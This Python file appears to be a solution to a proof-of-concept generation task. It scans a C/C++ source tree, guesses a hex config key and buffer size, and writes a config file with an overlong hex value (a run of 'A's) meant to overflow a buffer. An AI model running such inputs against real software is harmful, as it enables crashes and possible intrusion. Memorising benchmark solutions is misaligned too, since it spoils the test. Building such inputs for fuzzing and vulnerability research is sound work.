import os
import re
import io
import tarfile
import tempfile
from dataclasses import dataclass
from typing import Dict, Iterator, List, Optional, Tuple


@dataclass
class _FileEntry:
    path: str
    data: bytes


def _is_probably_text(data: bytes) -> bool:
    if not data:
        return True
    if b"\x00" in data:
        return False
    # Heuristic: allow common whitespace and printable bytes
    sample = data[:4096]
    bad = 0
    for b in sample:
        if b in (9, 10, 13):
            continue
        if 32 <= b <= 126:
            continue
        bad += 1
    return bad / max(1, len(sample)) < 0.08


def _decode_text(data: bytes) -> str:
    try:
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return data.decode("latin-1", errors="ignore")


def _iter_source_entries(src_path: str, max_bytes_per_file: int = 2_000_000) -> Iterator[_FileEntry]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                if st.st_size > max_bytes_per_file:
                    continue
                try:
                    with open(p, "rb") as f:
                        data = f.read(max_bytes_per_file)
                except Exception:
                    continue
                rel = os.path.relpath(p, src_path).replace("\\", "/")
                yield _FileEntry(rel, data)
        return

    # Tarball
    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return
    with tf:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            if m.size <= 0 or m.size > max_bytes_per_file:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read(max_bytes_per_file)
            except Exception:
                continue
            path = m.name
            if path.startswith("./"):
                path = path[2:]
            yield _FileEntry(path, data)


_CODE_EXTS = (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh")
_CONFIG_EXTS = (".conf", ".cfg", ".ini", ".cnf", ".rc", ".config", ".txt", ".json", ".yaml", ".yml", ".toml")


def _path_score_for_config(path: str) -> int:
    p = path.lower()
    score = 0
    if any(tok in p for tok in ("conf", "config", "cfg", "ini")):
        score += 5
    if any(tok in p for tok in ("example", "sample", "default", "test", "tests", "demo", "etc")):
        score += 7
    if p.endswith(_CONFIG_EXTS):
        score += 5
    # Prefer shorter paths (often top-level config)
    score -= min(10, p.count("/"))
    return score


_HEX_CHARS_RE = re.compile(r"^[0-9a-fA-F]+$")


def _even(n: int) -> int:
    return n if (n % 2 == 0) else (n + 1)


def _choose_hex_len(target_total: int, prefix_len: int, suffix_len: int, min_len: int) -> int:
    n = target_total - prefix_len - suffix_len
    if n < min_len:
        n = min_len
    n = n if n > 0 else min_len
    n = n if n % 2 == 0 else (n - 1)
    if n < min_len:
        n = min_len if min_len % 2 == 0 else (min_len + 1)
    return n


def _compute_suspected_hex_buf_size(code_texts: List[str]) -> int:
    sizes: List[int] = []

    # Macros that look relevant
    macro_re = re.compile(r'^\s*#\s*define\s+([A-Za-z0-9_]*HEX[A-Za-z0-9_]*|[A-Za-z0-9_]*KEY[A-Za-z0-9_]*LEN[A-Za-z0-9_]*|MAX_[A-Za-z0-9_]*HEX[A-Za-z0-9_]*)\s+(\d{2,5})\b', re.M)
    # Arrays with hex-ish variable names
    arr_re = re.compile(r'\b(?:unsigned\s+)?char\s+([A-Za-z_][A-Za-z0-9_]*hex[A-Za-z0-9_]*)\s*\[\s*(\d{2,5})\s*\]', re.I)

    for t in code_texts:
        for _, n in macro_re.findall(t):
            try:
                v = int(n)
                if 16 <= v <= 65536:
                    sizes.append(v)
            except Exception:
                pass
        for _, n in arr_re.findall(t):
            try:
                v = int(n)
                if 16 <= v <= 65536:
                    sizes.append(v)
            except Exception:
                pass

    if not sizes:
        return 0

    # Prefer values near common stack buffer sizes; but if larger than 600 exists, honor it.
    mx = max(sizes)
    if mx >= 600:
        return mx
    # else return best guess around 512 if present
    near_512 = [s for s in sizes if 448 <= s <= 768]
    if near_512:
        return max(near_512)
    return mx


def _extract_candidate_keys(code_texts: List[str]) -> Dict[str, int]:
    keys: Dict[str, int] = {}

    # strcmp(var, "key") or strcmp("key", var), includes strcasecmp, strncmp...
    cmp_re = re.compile(r'\b(?:str(?:case)?cmp|strn(?:case)?cmp)\s*\(\s*(?:"([^"]{1,80})"\s*,\s*\w+|\w+\s*,\s*"([^"]{1,80})")')
    getopt_re = re.compile(r'\b(?:get(?:env|opt(?:ion)?)?|config_get|ini_get|cfg_get)\w*\s*\(\s*"([^"]{1,80})"\s*[,)]', re.I)

    for t in code_texts:
        for a, b in cmp_re.findall(t):
            k = a or b
            if not k:
                continue
            if any(ch in k for ch in ("\n", "\r", "\t")):
                continue
            if len(k) > 64:
                continue
            keys[k] = keys.get(k, 0) + 1
        for k in getopt_re.findall(t):
            if not k or len(k) > 64:
                continue
            if any(ch in k for ch in ("\n", "\r", "\t")):
                continue
            keys[k] = keys.get(k, 0) + 1

    return keys


def _score_key(k: str) -> int:
    kl = k.lower()
    score = 0
    if "hex" in kl:
        score += 20
    if "key" in kl:
        score += 12
    if any(tok in kl for tok in ("mac", "seed", "hash", "iv", "uuid", "guid", "token", "secret", "psk", "pass")):
        score += 8
    if any(tok in kl for tok in ("id", "serial")):
        score += 3
    # key-like token (avoid long/space)
    if re.fullmatch(r"[A-Za-z0-9_.-]+", k):
        score += 5
    # penalize very short or very long keys slightly
    score -= abs(len(k) - 8) // 3
    return score


def _find_best_key(code_texts: List[str]) -> str:
    keys = _extract_candidate_keys(code_texts)
    if not keys:
        return "hex"
    best = None
    best_score = -10**9
    for k, freq in keys.items():
        s = _score_key(k) + min(10, freq)
        if s > best_score:
            best_score = s
            best = k
    return best or "hex"


def _split_inline_comment(line: str) -> Tuple[str, str]:
    # Splits on # or ; not inside simple quotes
    in_sq = False
    in_dq = False
    for i, ch in enumerate(line):
        if ch == "'" and not in_dq:
            in_sq = not in_sq
        elif ch == '"' and not in_sq:
            in_dq = not in_dq
        elif (ch == "#" or ch == ";") and not in_sq and not in_dq:
            return line[:i], line[i:]
    return line, ""


def _minify_config_text(text: str) -> str:
    out_lines: List[str] = []
    for raw in text.splitlines(True):
        s = raw.strip()
        if not s:
            continue
        if s.startswith("#") or s.startswith(";"):
            continue
        # keep section headers and any directive-like lines
        if s.startswith("[") and s.endswith("]"):
            out_lines.append(s + "\n")
            continue
        # keep json-ish too
        if ":" in raw or "=" in raw or '"' in raw:
            main, _c = _split_inline_comment(raw)
            s2 = main.rstrip()
            if s2.strip():
                out_lines.append(s2 + "\n")
    if not out_lines:
        # fallback keep original but trim long whitespace
        return "\n".join([ln.rstrip() for ln in text.splitlines() if ln.strip()]) + "\n"
    return "".join(out_lines)


def _patch_first_hex_value(text: str, new_hex: str) -> Optional[Tuple[str, str, str]]:
    """
    Returns (patched_text, patched_key, delimiter) or None
    """
    lines = text.splitlines(True)
    cur_section = None
    for idx, line in enumerate(lines):
        s = line.strip()
        if not s:
            continue
        if s.startswith("[") and s.endswith("]"):
            cur_section = s
            continue
        if s.startswith("#") or s.startswith(";"):
            continue

        main, comment = _split_inline_comment(line)
        main_stripped = main.strip()
        if not main_stripped:
            continue

        # JSON: "key": "AABBCC"
        mjson = re.match(r'^\s*"([^"]{1,64})"\s*:\s*"((?:0x|0X)?[0-9a-fA-F]{8,})"\s*,?\s*$', main)
        if mjson:
            key = mjson.group(1)
            val = mjson.group(2)
            prefix = ""
            core = val
            if core.startswith(("0x", "0X")):
                prefix = core[:2]
                core = core[2:]
            if _HEX_CHARS_RE.match(core):
                repl = f'"{key}": "{prefix}{new_hex}"'
                if main.rstrip().endswith(","):
                    repl += ","
                repl += "\n"
                lines[idx] = repl
                return ("".join(lines), key, ":")

        # key=value or key: value
        m = re.match(r'^\s*([A-Za-z0-9_.-]{1,64})\s*([=:])\s*(.+?)\s*$', main)
        if not m:
            continue
        key = m.group(1)
        delim = m.group(2)
        val = m.group(3).strip()

        quote = ""
        if len(val) >= 2 and ((val[0] == val[-1] == '"') or (val[0] == val[-1] == "'")):
            quote = val[0]
            val_core = val[1:-1].strip()
        else:
            val_core = val

        prefix = ""
        core = val_core
        if core.startswith(("0x", "0X")):
            prefix = core[:2]
            core = core[2:]

        # remove common separators in hex strings like ":" or "-"
        core_compact = core.replace(":", "").replace("-", "")
        if len(core_compact) >= 8 and _HEX_CHARS_RE.match(core_compact):
            # preserve separators? easiest: output compact
            new_val_core = prefix + new_hex
            if quote:
                new_val = quote + new_val_core + quote
            else:
                new_val = new_val_core
            patched_line = f"{key}{delim}{new_val}\n"
            lines[idx] = patched_line
            return ("".join(lines), key, delim)

    return None


def _select_best_config_file(entries: List[_FileEntry]) -> Optional[_FileEntry]:
    best = None
    best_score = -10**9
    for e in entries:
        p = e.path.lower()
        if not (p.endswith(_CONFIG_EXTS) or any(tok in p for tok in ("conf", "config", "cfg", "ini"))):
            continue
        if len(e.data) > 200_000:
            continue
        if not _is_probably_text(e.data):
            continue
        score = _path_score_for_config(e.path)
        # bump if contains obvious hex
        txt = _decode_text(e.data[:20000])
        if re.search(r'(?:0x)?[0-9a-fA-F]{16,}', txt):
            score += 10
        if re.search(r'^[ \t]*[A-Za-z0-9_.-]+\s*[=:]\s*(?:0x)?[0-9a-fA-F]{8,}', txt, re.M):
            score += 15
        if score > best_score:
            best_score = score
            best = e
    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        entries = list(_iter_source_entries(src_path))

        # Gather code texts for heuristics
        code_texts: List[str] = []
        for e in entries:
            if e.path.lower().endswith(_CODE_EXTS) and _is_probably_text(e.data):
                code_texts.append(_decode_text(e.data))

        best_key = _find_best_key(code_texts)
        suspected = _compute_suspected_hex_buf_size(code_texts)

        # Choose a default total PoC size target close to known ground-truth
        target_total = 547

        # If evidence suggests larger buffers, increase accordingly but keep reasonable
        min_hex_len = 514
        if suspected >= 600:
            min_hex_len = max(min_hex_len, _even(suspected + 2))
        else:
            min_hex_len = max(min_hex_len, 514)

        # Try to use and patch a real config from the source tree (minified) for validity
        cfg_entry = _select_best_config_file(entries)
        if cfg_entry is not None:
            cfg_text = _decode_text(cfg_entry.data)
            cfg_min = _minify_config_text(cfg_text)

            # compute hex length to hit near target_total if possible (but at least min_hex_len)
            # We'll patch value with new_hex; size doesn't directly control total file length here, so keep modest.
            hex_len = min_hex_len
            # If minified is already small, try to keep around target_total by adjusting hex length slightly.
            # Find an existing hex value and approximate overhead.
            approx_overhead = 16
            if len(cfg_min.encode("utf-8", errors="ignore")) < 1200:
                hex_len = _choose_hex_len(target_total, prefix_len=approx_overhead, suffix_len=0, min_len=min_hex_len)

            new_hex = "A" * hex_len
            patched = _patch_first_hex_value(cfg_min, new_hex)
            if patched is not None:
                patched_text, _k, _d = patched
                b = patched_text.encode("utf-8", errors="ignore")
                # If the patched config is too large, fall back to a minimal single-directive config.
                if len(b) <= 8192:
                    return b

            # If no hex directive found to patch, append a likely hex key line
            # Use small config base to keep it short and likely accepted
            hex_len = _choose_hex_len(target_total, prefix_len=len(best_key) + 1, suffix_len=1, min_len=min_hex_len)
            new_hex = "A" * hex_len
            minimal = f"{best_key}={new_hex}\n"
            # Try to keep any section headers (first one) if present
            first_section = None
            for ln in cfg_min.splitlines():
                s = ln.strip()
                if s.startswith("[") and s.endswith("]"):
                    first_section = s
                    break
            if first_section:
                minimal = f"{first_section}\n{minimal}"
            return minimal.encode("utf-8", errors="ignore")

        # Fallback: generate a minimal key=value config
        hex_len = _choose_hex_len(target_total, prefix_len=len(best_key) + 1, suffix_len=1, min_len=min_hex_len)
        new_hex = "A" * hex_len
        return (f"{best_key}={new_hex}\n").encode("utf-8", errors="ignore")